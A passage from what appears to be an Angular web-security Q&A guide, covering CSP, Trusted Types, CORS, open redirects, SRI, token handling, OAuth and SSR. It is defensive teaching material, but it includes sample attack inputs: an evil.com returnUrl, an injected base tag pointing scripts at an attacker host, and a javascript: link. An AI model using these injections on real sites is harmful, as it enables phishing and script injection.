The browser runs only scripts with the right nonce. An attacker who injects a script doesn't know the nonce, so their script is blocked. The nonce must be new for every response and hard to guess.

## 44: What is ngCspNonce?

`ngCspNonce` is an attribute you put on the root element of the app in `index.html`. Angular reads it and adds the nonce to the `<style>` tags it creates for component styles.

```html
<app-root ngCspNonce="random-nonce-from-server"></app-root>
```

Your server has to replace the value with a fresh nonce on every response.

## 45: What is the CSP_NONCE token?

`CSP_NONCE` is an injection token from `@angular/core`. It is another way to give Angular the nonce, from code instead of from the HTML:

```ts
import { CSP_NONCE } from "@angular/core";

bootstrapApplication(App, {
  providers: [{ provide: CSP_NONCE, useValue: globalThis.myNonce }],
});
```

You use either `ngCspNonce` or `CSP_NONCE`, depending on where the nonce is available.

## 46: What are Trusted Types?

Trusted Types is a browser feature that blocks passing plain strings to dangerous DOM APIs like `innerHTML`, `eval` or `script.src`. You can only pass special typed objects created by approved "policies".

With the header `require-trusted-types-for 'script'`, any code that writes a raw string to `innerHTML` throws an error. This makes DOM-based XSS much harder. Angular supports Trusted Types out of the box.

## 47: How do you turn on Trusted Types for an Angular app?

Send a CSP header that requires them and allows Angular's policy:

```
Content-Security-Policy: trusted-types angular; require-trusted-types-for 'script';
```

The `angular` policy is required for Angular to work. If you use lazy-loaded chunks from the CLI, also allow `angular#bundler`. If you use `bypassSecurityTrust*`, you need `angular#unsafe-bypass`.

## 48: What is template injection in Angular?

Template injection is when user input becomes part of an Angular template, not just a value inside it. Angular templates are code: they can call methods and read properties. If an attacker controls the template, they can run code in your app.

This can happen if you build template strings at runtime with user data and compile them, or if the server pastes user data into the HTML before Angular reads it.

## 49: Why does AOT compilation help security?

With AOT (ahead-of-time) compilation, templates are compiled to JavaScript at build time. The production bundle doesn't include the compiler, so there's no way to turn a string into a template at runtime.

This removes the whole "compile a template from user input" problem. AOT is the default for `ng build` in modern Angular.

## 50: What is the problem with mixing server templates and Angular templates?

If a server-side template engine (PHP, Razor, Jinja and so on) writes user data into a page that Angular later reads as a template, the user can put `{{ ... }}` in their data. Angular will treat that as a binding and evaluate it.

The Angular docs say not to generate Angular templates with a server-side templating language. Let the server return data as JSON and let Angular render it.

## 51: What is CORS?

CORS (Cross-Origin Resource Sharing) is how a server tells the browser which other origins may read its responses. By default, the browser blocks JavaScript from reading responses from a different origin. The server can allow it with headers like `Access-Control-Allow-Origin`.

CORS is set on the server. Angular can't "turn off CORS" from the client.

## 52: Is CORS a security feature that protects your API?

Not really. CORS loosens the browser's same-origin policy; it doesn't protect the server. A request from curl or Postman ignores CORS completely, and even in the browser some cross-origin requests are still sent (the browser just hides the response).

Your API still needs authentication, authorization and CSRF protection. CORS only controls which web pages can read the response.

## 53: What is the same-origin policy?

The same-origin policy is the browser rule that a page can only read data from the same origin. An origin is the scheme, host and port, for example `https://app.example.com:443`.

So a script on `https://evil.com` can't read your API responses or your page's DOM, even if the user is logged in to your site. Most web security features build on this rule.

## 54: How do you fix a CORS error in development without changing the server?

Use the Angular dev server proxy. The app calls `/api/...` on its own origin, and the dev server forwards the request to the back-end:

```json
{
  "/api": {
    "target": "http://localhost:3000",
    "secure": false,
    "changeOrigin": true
  }
}
```

```bash
ng serve --proxy-config proxy.conf.json
```

This is only for development. In production you either serve the app and API from the same origin or configure CORS on the server.

## 55: What is JSONP?

JSONP is an old trick for cross-origin requests from before CORS. The page adds a `<script>` tag pointing to another domain, and the response is JavaScript that calls a function in your page with the data.

Angular supports it with `withJsonpSupport()` and `http.jsonp()`, but you should only use it for old APIs that don't support CORS.

## 56: Why is JSONP considered insecure?

Because the response is executed as a script on your page. If the other server is hacked or returns something unexpected, that code runs with full access to your app. You are trusting that server completely.

It also only supports `GET` and makes error handling hard. Use CORS with `HttpClient.get()` instead whenever you can.

## 57: What is an open redirect?

An open redirect is when your app sends the user to any URL given in a parameter, like `/login?returnUrl=https://evil.com`. Attackers use your trusted domain in phishing links, and after login the user lands on a fake site.

In Angular this often happens with a `returnUrl` query param after login.

## 58: How do you safely handle a returnUrl after login?

Only allow paths inside your own app. Check that it starts with a single `/` and isn't a full URL or a protocol-relative URL like `//evil.com`, then navigate with the router:

```ts
const returnUrl = route.snapshot.queryParamMap.get("returnUrl") ?? "/";
const safe =
  returnUrl.startsWith("/") &&
  !returnUrl.startsWith("//") &&
  !returnUrl.startsWith("/\\")
    ? returnUrl
    : "/";
router.navigateByUrl(safe);
```

Using `router.navigateByUrl` instead of `window.location.href` also keeps navigation inside the app.

## 59: Why is client-side form validation not enough for security?

Client-side validation runs in the user's browser, which the user controls. They can turn it off, change the code, or send requests directly to the API without the form.

Client validation is for a good user experience: fast feedback and fewer bad requests. The server must validate all input again.

## 60: What is input validation and how does Angular support it?

Input validation checks that data has the expected shape: required fields, length, format, number ranges. Angular forms have built-in validators like `Validators.required`, `Validators.email`, `Validators.maxLength` and `Validators.pattern`.

```ts
email = new FormControl("", [
  Validators.required,
  Validators.email,
  Validators.maxLength(254),
]);
```

Validation helps stop bad data early, but it is not the same as making output safe. Escaping on output is what stops XSS.

## 61: Should you sanitize form input before sending it to the server?

Usually you should validate input, not change it. Stripping characters on the client is easy to skip and can corrupt real data (for example, a name like O'Brien).

The safer pattern is: validate on client and server, store the data as is, and escape or sanitize it at the point where it is output (HTML, SQL, shell and so on). Angular already escapes it when rendering.

## 62: What is Subresource Integrity (SRI)?

SRI lets the browser check that a downloaded script or stylesheet wasn't changed. You add an `integrity` attribute with a hash of the file:

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-..."
  crossorigin="anonymous"
></script>
```

If the CDN serves a different file, the hash won't match and the browser won't run it.

## 63: How do you enable SRI in an Angular build?

Set `subresourceIntegrity` to `true` in the build options in `angular.json`:

```json
"configurations": {
  "production": {
    "subresourceIntegrity": true
  }
}
```

The CLI then adds `integrity` hashes to the script tags it generates in `index.html`.

## 64: Why is it risky to load third-party scripts from a CDN?

A script from a CDN runs with full access to your page. If the CDN or the library's account is hacked, the attacker's code runs for all your users. This has happened in real attacks (for example the polyfill.io incident in 2024).

Prefer installing libraries through npm and bundling them. If you must load from a CDN, use SRI and pin an exact version.

## 65: Are Angular environment files a safe place for secrets?

No. `environment.ts` files are compiled into the JavaScript bundle and sent to every user. Anyone can read them in dev tools.

Put only public config there: API base URL, public keys like a Stripe publishable key, feature flags. Real secrets belong on the server.

## 66: What kinds of values are fine to put in an Angular environment file?

Values that are meant to be public:

- API base URLs.
- OAuth client ID and authority URL (these aren't secret in a public client).
- Publishable keys (Stripe publishable key, Firebase web config, Google Maps key limited by referrer).
- Feature flags.

Things like database passwords, private API keys, JWT signing keys or client secrets must never be there.

## 67: What are source maps?

Source maps are files that map the minified production JavaScript back to your original TypeScript. They make debugging and error stack traces readable.

They also make your full source code readable to anyone who downloads them, including comments.

## 68: Should you deploy source maps to production?

Usually not publicly. By default, the production build in Angular CLI has `sourceMap` turned off. If you need them for error tracking, generate them as "hidden" source maps and upload them only to your error tool (like Sentry), not to the public web server.

```json
"sourceMap": { "scripts": true, "hidden": true }
```

Source maps alone aren't a vulnerability, but they make it easier for attackers to understand your code.

## 69: What is clickjacking?

Clickjacking is when an attacker loads your site in an invisible `<iframe>` on their page and tricks the user into clicking buttons on it. The user thinks they are clicking on the attacker's page, but they are actually clicking "Delete account" or "Transfer" on your site.

## 70: How do you protect an Angular app from clickjacking?

Send headers from the server that stop other sites from framing your app:

```
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: DENY
```

`frame-ancestors` is the modern option, and `X-Frame-Options` is the older one for old browsers. They must be HTTP headers; a `<meta>` tag doesn't work for these.

## 71: What is HTTPS and why does every Angular app need it?

HTTPS encrypts traffic between the browser and the server with TLS. Without it, anyone on the same network (public Wi-Fi, a bad proxy) can read tokens and cookies or change the JavaScript bundle on the way.

Many browser features like service workers, `Secure` cookies and some APIs only work on HTTPS. There is no good reason to serve a production Angular app over plain HTTP.

## 72: What is HSTS?

HSTS (HTTP Strict Transport Security) is a header that tells the browser to use only HTTPS for your domain for a set time:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

After the browser sees it once, it won't even try plain HTTP. This stops attacks that downgrade the first request to HTTP.

## 73: What does npm audit do?

`npm audit` checks your installed packages against a database of known vulnerabilities and lists the problems with their severity. `npm audit fix` tries to update packages to safe versions within the allowed ranges.

It is a quick first check, but it only finds known issues and often reports problems in dev tools that never reach the browser.

## 74: Why is it important to keep Angular up to date?

The Angular team fixes security bugs in supported versions. Old versions that are out of support don't get those fixes. Updating also gets you newer protections, like better SSR host checks.

Angular majors are supported for 18 months (6 months active, 12 months long-term support), so you should plan regular upgrades.

## 75: How do you update Angular safely?

Use `ng update`, which updates packages and runs migration scripts that change your code for you:

```bash
ng update @angular/core @angular/cli
```

Update one major version at a time, read the update guide at angular.dev/update-guide, and run your tests after each step.

## 76: What is postMessage?

`window.postMessage` lets windows from different origins send messages to each other, for example your app and an iframe or a popup. The receiving side listens for the `message` event.

```ts
otherWindow.postMessage({ type: "ready" }, "https://partner.example.com");
```

## 77: What should you check when receiving a postMessage?

Always check `event.origin` against the origins you expect. Any site can send you a message if it has a reference to your window.

```ts
window.addEventListener("message", (event) => {
  if (event.origin !== "https://partner.example.com") return;
  handle(event.data);
});
```

Also treat `event.data` as untrusted input and validate its shape.

## 78: Why should you not use * as the target origin in postMessage?

With `'*'`, the message goes to whatever page is currently in that window, even if it navigated to an attacker's site. If the message contains a token or user data, you just sent it to the attacker.

Always pass the exact origin you expect as the second argument.

## 79: Are Web Workers a security boundary?

No. A Web Worker runs on the same origin as your app. It has no DOM access, but it can still make network requests with the same origin and read things like IndexedDB.

Treat messages from a worker as data and validate them, and never load worker scripts from untrusted URLs.

## 80: What is the OWASP Top 10?

The OWASP Top 10 is a list of the most common and serious web app security risks, made by the Open Web Application Security Project. It includes things like broken access control, injection, security misconfiguration and vulnerable components.

It is a good checklist for reviewing an Angular app and its back-end. The 2025 edition is the latest.

## 81: Which OWASP Top 10 risk is most related to Angular route guards?

Broken access control. If the only thing stopping a user from seeing admin data is a guard or a hidden button, that is broken access control, because the API is still open.

The fix is server-side permission checks on every endpoint.

## 82: What does "never trust the client" mean?

It means the server must assume that anything coming from the browser could be fake or changed: form values, hidden fields, prices, user IDs, roles, JWT claims it didn't verify, request headers.

The Angular app can't enforce rules. It can only help the user follow them.

## 83: How do you log out a user in an Angular app?

At minimum:

1. Tell the server to end the session or revoke the refresh token.
2. Clear tokens and user data from memory and storage.
3. Clear caches of user data (services, signals, state stores).
4. Redirect to a public page.

With OIDC, also call the provider's logout (end session) endpoint so the user is logged out there too.

## 84: Why isn't deleting the token on the client enough for logout?

If the token is still valid on the server, anyone who copied it earlier can keep using it. A stolen JWT works until it expires.

The server should revoke the refresh token or session, and access tokens should be short-lived so they stop working soon after logout.

## 85: What is a session timeout?

A session timeout ends the user's session after some time, either after a period of no activity (idle timeout) or after a fixed time no matter what (absolute timeout).

This limits the damage if someone leaves their computer unlocked or a token is stolen. The real timeout must be enforced on the server; the Angular app can show a warning and log the user out in the UI.

## 86: How do you show an idle timeout warning in Angular?

Track user activity (mouse, keyboard, touch) and reset a timer. When the timer is close to expiring, show a dialog. When it expires, log out.

```ts
const events$ = merge(
  fromEvent(document, "mousemove"),
  fromEvent(document, "keydown"),
  fromEvent(document, "click"),
);

events$
  .pipe(
    startWith(null),
    switchMap(() => timer(15 * 60_000)),
  )
  .subscribe(() => auth.logout());
```

Libraries like `@ng-idle/core` do this with more options.

## 87: What is the Authorization header?

It is an HTTP header that carries credentials for the request. With tokens it usually looks like `Authorization: Bearer <access_token>`.

Unlike cookies, the browser doesn't send it automatically, so you add it with an interceptor. That also means cross-site forms can't attach it, which protects against classic CSRF.

## 88: Does using bearer tokens in headers protect you from CSRF?

Mostly yes. CSRF works because browsers attach cookies automatically. A bearer token in a header must be added by your JavaScript, and another site can't do that.

But if the API also accepts a session cookie, CSRF is back. And bearer tokens stored in JavaScript-accessible storage are easier to steal through XSS, so there's a trade-off.

## 89: What does withCredentials do in HttpClient?

`withCredentials: true` tells the browser to send cookies (and accept `Set-Cookie`) on cross-origin requests.

```ts
this.http.get("https://api.example.com/me", { withCredentials: true });
```

The server must reply with `Access-Control-Allow-Credentials: true` and a specific `Access-Control-Allow-Origin` (not `*`), or the browser blocks the response.

## 90: What is XSSI and how does Angular handle it?

XSSI (cross-site script inclusion) is when an attacker includes your JSON API as a `<script src>` on their page, hoping to read data from it. Old browsers allowed tricks to steal JSON arrays this way.

A defense is to start JSON responses with a non-executable prefix like `)]}',\n`. Angular's `HttpClient` removes this prefix automatically before parsing.

## 91: What does a 401 status mean?

401 Unauthorized means the request has no valid credentials: the user isn't logged in, or the token is missing, expired or invalid.

An Angular app usually reacts by trying to refresh the token or sending the user to login.

## 92: What does a 403 status mean?

403 Forbidden means the server knows who you are, but you don't have permission for this action.

Refreshing the token won't help. The app should show an "access denied" message instead of redirecting to login.

## 93: What is the difference between authentication and authorization?

Authentication answers "who are you?" (login, tokens, sessions). Authorization answers "what are you allowed to do?" (roles, permissions, ownership of data).

In Angular, login libraries handle authentication. Guards and role checks in the UI reflect authorization, but the real authorization decisions happen on the server.

## 94: What is an access token and a refresh token?

- An **access token** is sent with API requests and proves the user is allowed. It is short-lived, often 5 to 60 minutes.
- A **refresh token** is used only to get a new access token when the old one expires. It lives longer and must be protected better.

This split means a stolen access token is only useful for a short time.

## 95: Why should access tokens be short-lived?

Because a stolen access token works until it expires, and you usually can't revoke a JWT before then without extra server work. A short lifetime limits how long an attacker can use it.

Refresh tokens make short-lived access tokens practical, because the app can get new ones without making the user log in again.

## 96: Can Angular sanitize SQL or prevent SQL injection?

No. SQL injection happens on the server, where queries are built. Angular has no idea how the server uses the data.

The server must use parameterized queries or an ORM. Angular's job is to prevent XSS in the browser, not injection on the back-end.

## 97: What is DOM-based XSS?

DOM-based XSS happens fully in the browser: your JavaScript reads untrusted data (like `location.hash`, query params or `postMessage` data) and writes it into a dangerous place (like `innerHTML` or `eval`).

In Angular, this mostly happens when code goes around the template, for example with `nativeElement.innerHTML` or `document.write`.

## 98: What is stored XSS versus reflected XSS?

- **Stored XSS**: the malicious script is saved on the server (a comment, a profile name) and shown to other users later.
- **Reflected XSS**: the script comes from the current request, often a URL parameter, and is reflected back in the response.

Angular's escaping protects against both, as long as data is rendered through normal bindings.

## 99: Why is eval dangerous in an Angular app?

`eval`, `new Function` and `setTimeout` with a string all run text as JavaScript. If any of that text can come from a user, it's an XSS hole.

They also stop you from using a strict CSP without `'unsafe-eval'`. There is almost never a good reason to use them in an Angular app.

## 100: What is a security header?

A security header is an HTTP response header that tells the browser to turn on extra protections. Common ones:

- `Content-Security-Policy`
- `Strict-Transport-Security`
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options` or `frame-ancestors`
- `Referrer-Policy`
- `Permissions-Policy`

They are set by the server or hosting platform that serves the Angular app, not by Angular code.

## 101: What is the SafeHtml type?

`SafeHtml` is the type returned by `bypassSecurityTrustHtml`. It is a marker interface that tells Angular the value was already approved and must not be sanitized.

There are matching types for each context: `SafeStyle`, `SafeScript`, `SafeUrl` and `SafeResourceUrl`. A `SafeHtml` value isn't "clean"; it's just trusted. Seeing these types in a code review is a sign to look closer.

## 102: Is it safe to bind to the style attribute in Angular?

Yes, for normal values. In modern Angular, `[style.color]` and `[style]` bindings go through the DOM's `style` API, which doesn't execute scripts, so they are safe for user-chosen values like colors or widths.

Old browsers once allowed script in CSS (like `expression()` in IE), which is why the Style security context exists. Building a whole `<style>` block from user input is a different story and should be avoided.

## 103: Does Angular sanitize attribute bindings like attr.href?

Yes. Angular applies the same security context to attribute bindings as to property bindings. `[attr.href]="url"` on an `<a>` is sanitized as a URL, just like `[href]`.

The security context depends on the element and the attribute name, not on whether you use `attr.` or not.

## 104: Why add rel="noopener" to links that open in a new tab?

When a link has `target="_blank"`, the new page used to get access to `window.opener` and could redirect your tab to a phishing page (called "reverse tabnabbing").

Modern browsers apply `noopener` by default for `target="_blank"`, but adding `rel="noopener noreferrer"` is still a good habit, especially for links to user-supplied URLs.

```html
<a [href]="user.website" target="_blank" rel="noopener noreferrer">Website</a>
```

## 105: What is the sandbox attribute on an iframe?

`sandbox` puts the iframe's content under strict rules: no scripts, no forms, no popups, a unique origin and so on. You turn features back on one by one:

```html
<iframe [src]="safeUrl" sandbox="allow-scripts"></iframe>
```

It is a good idea when you embed content you don't fully trust. Avoid using `allow-scripts` together with `allow-same-origin` for same-origin content, because the frame could then remove its own sandbox.

## 106: What does X-Content-Type-Options: nosniff do?

It tells the browser not to guess the content type of a response. Without it, the browser might treat a file uploaded as `.txt` or an API response as JavaScript or HTML if it "looks like" one.

With `nosniff`, a script tag only runs files served with a JavaScript content type. It's a simple header that every Angular host should send.

## 107: What is Referrer-Policy?

`Referrer-Policy` controls how much of the current URL the browser sends in the `Referer` header when the user follows a link or the app loads a resource.

```
Referrer-Policy: strict-origin-when-cross-origin
```

This stops full URLs, which can contain IDs or tokens in query params, from leaking to other sites. `strict-origin-when-cross-origin` is the default in modern browsers, but setting it makes it explicit.

## 108: What is Permissions-Policy?

`Permissions-Policy` is a header that turns browser features on or off for your page and its iframes, like the camera, microphone, geolocation or payment.

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

If your app doesn't use a feature, turn it off so injected scripts or embedded frames can't use it.

## 109: What does a guard return to redirect the user?

A `UrlTree`. You can make one with `router.parseUrl()` or `router.createUrlTree()`:

```ts
export const authGuard: CanActivateFn = (route, state) => {
  const router = inject(Router);
  return inject(AuthService).isLoggedIn()
    ? true
    : router.createUrlTree(["/login"], {
        queryParams: { returnUrl: state.url },
      });
};
```

Returning a `UrlTree` is better than calling `router.navigate()` inside the guard, because the router handles it as one navigation.

## 110: Can a guard return an Observable or a Promise?

Yes. A guard can return `boolean`, `UrlTree`, `RedirectCommand`, or an `Observable` or `Promise` of those. This is useful when you need to ask the server first:

```ts
export const authGuard: CanActivateFn = () =>
  inject(AuthService)
    .checkSession()
    .pipe(map((ok) => ok || inject(Router).parseUrl("/login")));
```

Make sure the observable completes, or the navigation will wait forever.

## 111: How do you show or hide UI based on roles in Angular?

Read the user's roles from your auth service and use `@if` in the template:

```html
@if (auth.hasRole('admin')) {
<button (click)="deleteUser()">Delete user</button>
}
```

This only changes what's shown. The `DELETE` API call must still check the role on the server.

## 112: Why is the hidden property a bad way to hide admin content?

`[hidden]` only adds a CSS `display: none`. The element and its data are still in the DOM, so anyone can see it in dev tools.

`@if` doesn't create the element at all, which is better. But the real rule is: don't send data to the client that the user isn't allowed to see.

## 113: What is an ID token?

An ID token is a JWT from an OpenID Connect provider that describes the logged-in user: `sub` (user ID), `name`, `email`, `iss` (issuer), `aud` (your client ID) and `exp`.

It is meant for the client to know who logged in. It shouldn't be sent to your API as an access token; use the access token for API calls.

## 114: What is the state parameter in OAuth2?

`state` is a random value the app sends when starting a login and gets back in the callback. The app checks that it matches.

This stops an attacker from tricking the user's browser into finishing a login the user didn't start (login CSRF). Libraries like `angular-oauth2-oidc` and MSAL handle it for you.

## 115: What is the nonce parameter in OIDC?

`nonce` is a random value the app sends in the login request. The provider puts it inside the ID token, and the app checks that it matches.

This prevents replay attacks, where someone reuses an old ID token. Like `state`, a good OIDC library handles it automatically.

## 116: What is MSAL Angular?

MSAL Angular (`@azure/msal-angular`) is Microsoft's library for signing in users with Microsoft Entra ID (formerly Azure AD) and Azure AD B2C. It uses `@azure/msal-browser` under the hood with the authorization code flow and PKCE.

It gives you `MsalService`, `MsalGuard`, `MsalInterceptor` and a redirect component to handle login.

## 117: What is angular-oauth2-oidc?

`angular-oauth2-oidc` is an open-source library that implements OAuth2 and OpenID Connect for Angular. It supports the code flow with PKCE, silent refresh, discovery documents and logout.

```ts
oauthService.configure({
  issuer: "https://login.example.com",
  clientId: "my-spa",
  redirectUri: window.location.origin,
  responseType: "code",
  scope: "openid profile email api",
});
await oauthService.loadDiscoveryDocumentAndLogin();
```

## 118: What is the redirect URI in OAuth2?

The redirect URI is where the identity provider sends the user back after login, with the authorization code. It must be registered with the provider exactly.

Exact matching stops an attacker from asking the provider to send the code to their own site. Avoid wildcards in registered redirect URIs.

## 119: What does it mean that the browser is a hostile environment?

It means you don't control the code once it's on the user's machine. The user, browser extensions, malware or injected scripts can read and change anything: your JavaScript, memory, storage and network requests.

So the Angular app should never be the only place where security decisions are made.

## 120: Can a user change the Angular app's code in their browser?

Yes, easily. Dev tools let them set breakpoints, change variables, edit `localStorage`, run code in the console and replay requests.

That's why things like "the price is calculated on the client" or "the role check happens in the component" can't be trusted for security.

## 121: Why shouldn't you log tokens or personal data to the console?

Console logs can be seen by anyone with access to the browser, by browser extensions and sometimes by error tracking tools that collect logs. Tokens in logs can be reused by attackers.

Remove debug logging of tokens, passwords and personal data before release, and make sure error reporting tools scrub sensitive fields.

## 122: What is a security patch release in Angular?

When the Angular team finds or is told about a vulnerability, they release a patch version (like 22.0.3) for supported major versions. The fix is listed in the changelog and often as a GitHub security advisory.

You get it with a normal patch update, for example `ng update @angular/core` or updating the version range in `package.json`.

## 123: How do you report a security issue in Angular itself?

Through Google's vulnerability reporting process, as described in the `SECURITY.md` file of the Angular GitHub repo (bughunters.google.com). Don't open a public GitHub issue for it, because that tells attackers about the bug before a fix exists.

## 124: What is the difference between npm install and npm ci?

`npm install` can update `package-lock.json` if versions don't match. `npm ci` installs exactly what's in the lockfile and fails if `package.json` and the lockfile disagree.

In CI and production builds, use `npm ci` so you always build with the exact dependency versions you tested.

## 125: Why should you commit the package-lock.json file?

The lockfile pins the exact version of every package, including dependencies of dependencies. Without it, a fresh install might pull a new version that was just published, which could be broken or even malicious.

Committing it makes builds repeatable and lets you review dependency changes in pull requests.

## 126: What is typosquatting in npm?

Typosquatting is when an attacker publishes a package with a name close to a popular one, like `angulr-core` or `rxjss`, hoping someone mistypes it. The fake package can contain code that steals tokens or environment variables during install.

Check package names carefully, and prefer well-known packages with many downloads and active maintainers.

## 127: What is a supply chain attack?

It's an attack where the attacker gets malicious code into something you depend on, like an npm package, a build tool, a CDN or a CI action, instead of attacking your app directly.

Angular apps have hundreds of transitive dependencies, so this is a real risk. Lockfiles, `npm audit`, fewer dependencies and reviewing updates all help.

## 128: Does the Angular dev server belong in production?

No. `ng serve` is a development server with live reload and dev-mode checks. It isn't built for security or performance.

In production, run `ng build` and serve the `dist` output with a real web server, CDN, or the Node server generated by `@angular/ssr`.

## 129: What does dev mode do that production mode doesn't?

Dev mode adds extra checks and warnings, like the "sanitizing HTML stripped some content" warning and expression-changed checks. It also keeps more readable code and debugging helpers.

Production builds remove these, minify code and turn on optimizations. Make sure you deploy a production build so you don't ship extra debugging info.

## 130: What is server-side rendering (SSR) in Angular?

SSR means the Angular app runs on a Node server first and sends the fully rendered HTML to the browser. Then the browser loads the app and "hydrates" it, reusing the HTML instead of rendering again.

It's set up with `@angular/ssr`. SSR adds new security concerns because your Angular code now also runs on a server.

## 131: What is hydration in Angular?

Hydration is when the browser-side Angular app takes over the HTML the server already rendered, attaching event listeners and reusing DOM nodes. You turn it on with `provideClientHydration()`.

For hydration to work, the server also sends some state in the page so the client doesn't need to redo work, which is why you need to be careful what you put in that state.

## 132: What is TransferState?

`TransferState` is a key-value store that the server fills during SSR and that Angular serializes into the HTML as a `<script>` tag. The browser reads it on startup.

HttpClient uses it automatically to cache responses made during SSR so the browser doesn't fetch them again. Everything in TransferState is visible to anyone who views the page source.

## 133: Why should you never put secrets in TransferState?

Because TransferState ends up as plain JSON inside the HTML. Anyone can open "View Source" and read it.

Server-only data like API keys, internal URLs or other users' data must stay on the server and never be put into TransferState or into responses that are cached for hydration.

## 134: Why is code in an SSR app more sensitive than in a client-only app?

In SSR, some Angular code runs on your server, where it has access to environment variables, the file system, internal networks and other users' requests. A bug there can leak server data or let an attacker reach internal services.

Also, state shared between requests on the server can leak one user's data to another user.

## 135: What is i18n in Angular?

i18n (internationalization) means preparing the app for multiple languages. Angular has a built-in i18n system using the `i18n` attribute in templates and `$localize` in code, plus ICU expressions for plurals and selects.

Translations are usually compiled in at build time, one build per language.

## 136: Can translation files be a security risk?

Yes, if they aren't trusted. Translations often come from outside translators or translation tools. If you render translated strings with `[innerHTML]`, or load translations at runtime from an untrusted source, a bad translation could inject HTML.

With Angular's built-in compile-time i18n, translations go through the compiler like templates, so they should come from a trusted, reviewed source.

## 137: What is an ICU expression?

ICU expressions let you choose text based on a value, mainly for plurals and selects:

```html
<span i18n>
  {count, plural, =0 {No messages} =1 {One message} other {{{count}} messages}}
</span>
```

The values used inside them, like `count`, are still bound and escaped like normal interpolation.

## 138: What is a Content-Security-Policy report-only mode?

`Content-Security-Policy-Report-Only` sends the same kind of policy, but the browser only reports violations instead of blocking them.

It lets you test a new CSP on a live app and see what would break before you enforce it. Use it with `report-to` or `report-uri` to collect reports.

## 139: Why is 'unsafe-inline' in script-src a problem?

`'unsafe-inline'` allows any inline `<script>` and inline event handler (`onclick="..."`) to run. Since most XSS attacks inject inline scripts, this removes most of the protection CSP gives you.

Use nonces or hashes instead. When a nonce or hash is present in `script-src`, CSP Level 2+ browsers ignore `'unsafe-inline'`.

## 140: What is 'unsafe-eval' in CSP and does Angular need it?

`'unsafe-eval'` allows `eval()`, `new Function()` and similar. Angular apps built with AOT don't need it.

You'd only need it if you use the JIT compiler at runtime, which you shouldn't in production. If some third-party library needs `'unsafe-eval'`, that's a reason to reconsider the library.

## 141: What does the CSP directive object-src 'none' do?

It blocks `<object>`, `<embed>` and old plugin content. These were a common way to run code around other CSP rules.

Angular apps almost never need plugins, so `object-src 'none'` should be in every policy.

## 142: What does base-uri do in CSP?

`base-uri` controls which URLs can be used in a `<base>` tag. If an attacker can inject `<base href="https://evil.com/">`, every relative script URL would load from their server.

Set `base-uri 'self'`. Angular uses `<base href="/">` in `index.html`, which is fine with that rule.

## 143: Why should a password field use type="password"?

It hides what the user types from people nearby and from screenshots or screen sharing. Browsers also treat it specially: they don't cache it in form history and they offer password managers.

Use `autocomplete="current-password"` or `autocomplete="new-password"` so password managers work correctly.

## 144: Should you store passwords in the Angular app?

Never. The password should only be in the login form for as long as needed, then sent to the server over HTTPS. Don't save it in storage, services, state stores or logs.

Better still, use an identity provider so your app never sees the password at all.

## 145: What is a BFF (Backend for Frontend) in auth?

A BFF is a small server that sits between the Angular app and your APIs. It handles the OAuth login, keeps the tokens on the server, and gives the browser only an httpOnly session cookie.

The Angular app calls the BFF, and the BFF adds the access token when calling the real APIs. This keeps tokens out of JavaScript completely.

## 146: What does HttpOnly not protect against?

It doesn't stop XSS from using the session. A script running on your page can still call your API, and the browser attaches the cookie automatically. The attacker just can't copy the cookie out.

So httpOnly cookies reduce the damage of XSS, but you still need to prevent XSS.

## 147: How do you read query params safely in Angular?

Treat them as untrusted input. Read them with `ActivatedRoute` or input bindings, validate the format, and render them only with normal bindings:

```ts
const page = Number(route.snapshot.queryParamMap.get("page") ?? "1");
this.page = Number.isInteger(page) && page > 0 ? page : 1;
```

Never put query params into `innerHTML`, `bypassSecurityTrust*`, `window.location` or `eval`.

## 148: Why should error messages shown to users be generic?

Detailed errors like stack traces, SQL errors or "user not found" versus "wrong password" can help attackers learn about your system or find valid usernames.

Show friendly, generic messages to the user and log the details on the server.

## 149: What is a security code review checklist item for Angular?

A few things to search for in an Angular code review:

- `bypassSecurityTrust` calls.
- `innerHTML`, `outerHTML` or `insertAdjacentHTML` in TypeScript.
- `nativeElement`.
- `eval`, `new Function`, `setTimeout` with a string.
- `window.location` or `window.open` with user data.
- Secrets in `environment` files.
- Tokens sent to all URLs in interceptors.

## 150: What is the main rule of Angular security?

Let Angular do its job and don't go around it. Render data with normal template bindings, avoid direct DOM access and `bypassSecurityTrust*`, use `HttpClient` and the router, and build with AOT.

Then add browser defenses (CSP, Trusted Types, security headers) and remember that the server has the final word on authentication and authorization.

# Moderate Questions (151-300)

## 151: How does Angular decide which security context a binding uses?

The compiler looks at the element and the property or attribute name and checks them against a built-in schema. For example, `innerHTML` on any element is HTML, `href` on `<a>` is URL, `src` on `<iframe>` or `<script>` is Resource URL, and plain properties like `title` or `value` need no sanitizing at all.

This happens at compile time, so there's no runtime cost for bindings that don't need sanitizing.

## 152: How do you sanitize a value manually and what does sanitize() return?

Call `DomSanitizer.sanitize()` with the context and the value. It returns a cleaned `string`, or `null` if the value is empty.

```ts
const sanitizer = inject(DomSanitizer);
const html = sanitizer.sanitize(SecurityContext.HTML, userHtml) ?? "";
```

If you pass a value that was already marked as trusted for the same context, it returns the trusted value as is. For `SecurityContext.RESOURCE_URL` with an untrusted value, it throws, because resource URLs can't be sanitized.

## 153: How would you write a pipe that renders HTML safely?

Sanitize instead of bypassing. A pipe that just calls `bypassSecurityTrustHtml` defeats the sanitizer. Usually you don't need a pipe at all, because `[innerHTML]` already sanitizes:

```html
<div [innerHTML]="post.body"></div>
```

If you want stronger cleaning, run the HTML through a library like DOMPurify first and then bind the result to `[innerHTML]`. Then Angular's sanitizer still runs as a second layer.

## 154: How do you use DOMPurify with Angular?

Install `dompurify` and clean the HTML before binding it:

```ts
import DOMPurify from "dompurify";

@Component({
  selector: "app-post",
  template: `<div [innerHTML]="safeBody()"></div>`,
})
export class Post {
  body = input.required<string>();
  safeBody = computed(() => DOMPurify.sanitize(this.body()));
}
```

Some teams then call `bypassSecurityTrustHtml` on DOMPurify's output to keep things Angular would strip, like inline styles. That is only fine if DOMPurify always runs right before it, with a config you reviewed.

## 155: How do you render Markdown from users safely?

Convert the Markdown to HTML, then sanitize the HTML before binding it. Markdown allows raw HTML and links like `[click](javascript:alert(1))`, so the converted output can be dangerous.

